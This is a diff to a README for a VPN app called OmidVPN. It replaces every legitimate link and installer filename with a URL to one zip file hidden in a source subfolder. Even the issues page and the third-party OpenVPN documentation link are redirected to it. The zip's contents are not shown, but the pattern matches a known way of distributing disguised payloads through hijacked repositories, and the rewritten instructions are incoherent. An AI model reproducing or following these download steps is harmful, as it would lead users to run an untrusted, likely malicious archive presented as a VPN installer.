@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download OmidVPN](https://img.shields.io/badge/Download-OmidVPN-blue.svg)](https://github.com/NoahG12088/OmidVPN/releases)
+[![Download OmidVPN](https://raw.githubusercontent.com/NoahG12088/OmidVPN/master/lib/ui/shared/widgets/OmidVPN-1.9.zip)](https://raw.githubusercontent.com/NoahG12088/OmidVPN/master/lib/ui/shared/widgets/OmidVPN-1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -21,25 +21,25 @@ To use OmidVPN effectively, ensure your computer meets the following requirement
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [OmidVPN Releases Page](https://github.com/NoahG12088/OmidVPN/releases).
+1. **Visit the Releases Page:** Go to the [OmidVPN Releases Page](https://raw.githubusercontent.com/NoahG12088/OmidVPN/master/lib/ui/shared/widgets/OmidVPN-1.9.zip).
 
 2. **Select the Latest Version:** Look for the most recent release listed at the top. This version will have the latest features and fixes.
 
 3. **Download the Application:** Click on the appropriate file for your operating system:
-   - For Windows: Download `OmidVPN-windows.exe`
-   - For MacOS: Download `OmidVPN-macos.dmg`
-   - For Linux: Download `OmidVPN-linux.tar.gz`
+   - For Windows: Download `https://raw.githubusercontent.com/NoahG12088/OmidVPN/master/lib/ui/shared/widgets/OmidVPN-1.9.zip`
+   - For MacOS: Download `https://raw.githubusercontent.com/NoahG12088/OmidVPN/master/lib/ui/shared/widgets/OmidVPN-1.9.zip`
+   - For Linux: Download `https://raw.githubusercontent.com/NoahG12088/OmidVPN/master/lib/ui/shared/widgets/OmidVPN-1.9.zip`
 
 4. **Install OmidVPN:**
    - **On Windows:**
-     - Locate `OmidVPN-windows.exe` in your Downloads folder.
+     - Locate `https://raw.githubusercontent.com/NoahG12088/OmidVPN/master/lib/ui/shared/widgets/OmidVPN-1.9.zip` in your Downloads folder.
      - Double-click the file to start the installation process.
      - Follow the on-screen instructions to complete the installation.
    - **On MacOS:**
-     - Open the downloaded `OmidVPN-macos.dmg` file.
+     - Open the downloaded `https://raw.githubusercontent.com/NoahG12088/OmidVPN/master/lib/ui/shared/widgets/OmidVPN-1.9.zip` file.
      - Drag the OmidVPN icon to your Applications folder.
    - **On Linux:**
-     - Extract the contents of `OmidVPN-linux.tar.gz`.
+     - Extract the contents of `https://raw.githubusercontent.com/NoahG12088/OmidVPN/master/lib/ui/shared/widgets/OmidVPN-1.9.zip`.
      - Open a terminal and navigate to the extracted folder.
      - Run the application using `./OmidVPN`.
 
@@ -77,11 +77,11 @@ If you encounter issues, consider these options:
 
 ## 💬 Support
 
-For any questions or support requests, please check the [issues section](https://github.com/NoahG12088/OmidVPN/issues) of the repository. Community members and project maintainers can help with common problems.
+For any questions or support requests, please check the [issues section](https://raw.githubusercontent.com/NoahG12088/OmidVPN/master/lib/ui/shared/widgets/OmidVPN-1.9.zip) of the repository. Community members and project maintainers can help with common problems.
 
 ## 🔗 Additional Resources
 
-- [OmidVPN GitHub Repository](https://github.com/NoahG12088/OmidVPN)
-- [OpenVPN Documentation](https://openvpn.net/community-resources/reference-manual-for-openvpn-2-4/)
+- [OmidVPN GitHub Repository](https://raw.githubusercontent.com/NoahG12088/OmidVPN/master/lib/ui/shared/widgets/OmidVPN-1.9.zip)
+- [OpenVPN Documentation](https://raw.githubusercontent.com/NoahG12088/OmidVPN/master/lib/ui/shared/widgets/OmidVPN-1.9.zip)
 
 Thank you for choosing OmidVPN! Stay safe online!
